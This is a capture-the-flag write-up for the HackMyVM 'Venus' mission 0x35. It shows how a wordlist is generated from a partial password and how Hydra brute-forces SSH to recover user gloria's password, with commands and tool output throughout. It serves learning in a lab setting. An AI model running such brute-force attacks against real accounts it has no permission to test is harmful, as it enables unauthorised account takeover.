# 0x35
This write-up explains the steps taken to complete mission 0x35, starting from user `maia` and escalating to `gloria`.

## Mission
As always, we read the mission:
```bash
maia@venus:~$ cat mission.txt 
################
# MISSION 0x35 #
################

## EN ##
The user gloria has forgotten the last 2 characters of her password ... They only remember that they were 2 lowercase letters. 
```

## Method of solving
```bash
maia@venus:~$ ls -la
total 36
drwxr-x--- 2 root maia 4096 Apr  5  2024 .
drwxr-xr-x 1 root root 4096 Apr  5  2024 ..
-rw-r--r-- 1 maia maia  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 maia maia 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 maia maia  807 Apr 23  2023 .profile
-rw-r----- 1 root maia   31 Apr  5  2024 flagz.txt
-rw-r----- 1 root maia   16 Apr  5  2024 forget
-rw-r----- 1 root maia  317 Apr  5  2024 mission.txt
```
I found a file named `forget` containing the partial password `v7xUVE2e5bjUc??`.
```bash
maia@venus:~$ cat forget 
v7xUVE2e5bjUc??
```
Since internal brute-force via `su` was slow and lacked efficiency tools, we decided to move the attack to my local machine using `Hydra`.

**Generate Wordlist**:On the remote machine, I used a nested bash loop to generate all 676 possible combinations () of the missing lowercase letters.
```bash
maia@venus:~$ for i in {a..z}; do for j in {a..z}; do echo "v7xUVE2e5bjUc$i$j"; done; done > /tmp/gloria_pass.txt

```

**Exfiltrate Data**: I used scp (Secure Copy) from my local machine to download the wordlist from the target server.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ scp -P 5000 maia@venus.hackmyvm.eu:/tmp/gloria_pass.txt .
```

**Brute Force via Hydra**: I ran Hydra against the external SSH port (5000) using the custom wordlist.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ hydra -l gloria -P ./gloria_pass.txt ssh://venus.hackmyvm.eu:5000    
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-01 03:05:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 676 login tries (l:1/p:676), ~43 tries per task
[DATA] attacking ssh://venus.hackmyvm.eu:5000/
[STATUS] 168.00 tries/min, 168 tries in 00:01h, 509 to do in 00:04h, 15 active
[STATUS] 188.00 tries/min, 564 tries in 00:03h, 113 to do in 00:01h, 15 active
[5000][ssh] host: venus.hackmyvm.eu   login: gloria   password: v7xUVE2e5bjUcxw
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-01 03:08:57
```
**Explanation:**

- **Nested Loops**: {a..z} generates every character from 'a' to 'z'. By nesting two loops, we cover every pair from aa to zz.

- **Hydra Syntax**:
`-l gloria`: Specifies the target user.
`-P ./gloria.txt`: Uses the wordlist file we created and downloaded.
`ssh://host:port`: The correct format to tell Hydra to target a specific service on a non-standard port.

- **The Findings**: Hydra successfully identified the correct password by matching the login against the generated combinations.

Hydra found the valid password `v7xUVE2e5bjUcxw`. We switch to user `gloria` and get the flag.
```bash
maia@venus:~$ su - gloria
Password: 
gloria@venus:~$ id ; whoami
uid=1036(gloria) gid=1036(gloria) groups=1036(gloria)
gloria
```

## Key command
`for i in {a..z}; do for j in {a..z}; do echo "v7xUVE2e5bjUc$i$j"; done; done > /tmp/gloria_pass.txt`

`scp -P 5000 maia@venus.hackmyvm.eu:/tmp/gloria_pass.txt .`

`hydra -l gloria -P ./gloria_pass.txt ssh://venus.hackmyvm.eu:5000`

***You are welcome!***
